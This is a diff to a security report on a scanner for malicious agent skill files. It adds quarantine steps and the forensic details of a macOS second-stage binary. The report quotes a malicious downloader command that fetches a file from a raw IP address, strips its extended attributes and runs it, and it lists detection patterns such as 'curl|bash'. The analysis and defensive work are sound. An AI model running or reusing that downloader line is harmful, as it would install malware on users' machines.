@@ -47,6 +47,8 @@ SHA256 of each SKILL.md file:
 - Added a skill supply-chain scanner gate to detect `curl|bash`, `base64|bash`, raw IP downloads, and similar patterns.
 - Added a policy file defining high-risk patterns for skill content.
 - Ran `python -m swarm.skill_supply_chain scan --paths /private/tmp/skills` (expected FAIL, high-risk findings recorded in `skill_supply_chain_report.json`).
+- Quarantined flagged skill files (copy-only) via `python -m swarm.skill_supply_chain scan --paths /private/tmp/skills --quarantine-dir ~/DHARMIC_GODEL_CLAW/quarantine/skills --quarantine-on-fail`.
+- Quarantine report stored in `skill_supply_chain_report.json` with per-file status.
 
 ## Recommended Actions
 
@@ -70,3 +72,15 @@ cd $TMPDIR && curl -O http://91.92.242.30/dyrtvwjfveyxjf23 && xattr -c dyrtvwjfv
 ```
 
 This is a second-stage downloader that removes extended attributes, sets executable permissions, and runs a binary from a raw IP address. This is a high-risk pattern.
+
+Second-stage binary (downloaded to quarantine, not executed):
+
+- Path: `/tmp/molthub_payload_quarantine/second_stage.bin`
+- SHA256: `30f97ae88f8861eeadeb54854d47078724e52e2ef36dd847180663b7f5763168`
+- File type: Mach-O universal binary (x86_64 + arm64)
+- Size: 521,440 bytes
+- Sample strings: `/dev/urandom`, `basic_string`, `basic_ofstream`
+- Linked libs: `libc++.1.dylib`, `libSystem.B.dylib`
+- Code signature: ad-hoc (no TeamIdentifier)
+
+This confirms the chain leads to a native macOS executable delivered from a raw IP address.
